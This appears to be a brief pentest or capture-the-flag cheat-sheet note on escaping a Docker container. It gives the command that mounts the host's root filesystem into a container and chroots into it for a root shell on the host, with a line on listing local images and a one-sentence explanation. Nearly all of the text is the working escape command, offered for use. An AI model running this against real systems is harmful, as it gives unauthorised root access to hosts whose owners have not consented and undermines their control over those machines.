
```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

Check to see which image is there run the following command: 

```
docker image
```

Mounts the host's root into the container at /mnt --> escaped the container and gained root access on  the host system.

```
docker run -v /:/mnt --rm -it <docker-image> chroot /mnt sh
```

